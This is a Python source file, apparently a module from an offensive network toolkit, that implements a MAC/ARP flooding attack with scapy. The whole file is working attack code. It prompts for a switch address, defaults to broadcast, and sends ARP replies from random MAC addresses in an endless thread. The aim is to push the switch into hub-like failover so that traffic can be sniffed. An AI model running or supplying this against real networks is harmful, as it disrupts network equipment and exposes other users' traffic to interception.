import util
from scapy.all import ARP,Ether,sendp
from scapy.volatile import RandMAC
from scapy.layers.l2 import getmacbyip
from threading import Thread
from parameter import Parameter

class switchover(Parameter):
	""" Flood a switch with ARP packets in an attempt
		to get it to failover into a hub.  Not all switch's
		will do this, but this is the general case.
	"""
	def __init__(self):
		self.switch = None
		self.sent   = 0
		super(switchover,self).__init__('Switch Over')

	def initialize(self):
		try:
			util.Msg('[enter] for broadcast')
			self.switch = raw_input('[!] Enter switch address: ')

			if self.switch == '': self.switch = 'FF:FF:FF:FF:FF:FF'
			else: self.switch = getmacbyip(self.switch)	
		except: return None

		self.running = True
		thread = Thread(target=self.spam)
		thread.start()
		return 'Spamming %s'%(self.switch)

	def spam(self):
		""" Begin spamming the switch with ARP packets from
			random MAC's
		"""
		arp = ARP(op=2, psrc='0.0.0.0', hwdst=self.switch)
		while self.running:
			pkt = Ether(src=RandMAC(),dst=self.switch)
			pkt /= arp
			sendp(pkt)
			self.sent += 1
			if self.sent % 50 == 0: self.log_msg('Sent %d requests...'%(self.sent))

	def view(self):
		""" Dump out the number of requests initially
		"""
		util.Msg('Sent %d MAC requests thus far'%(self.sent))
		super(switchover,self).view()
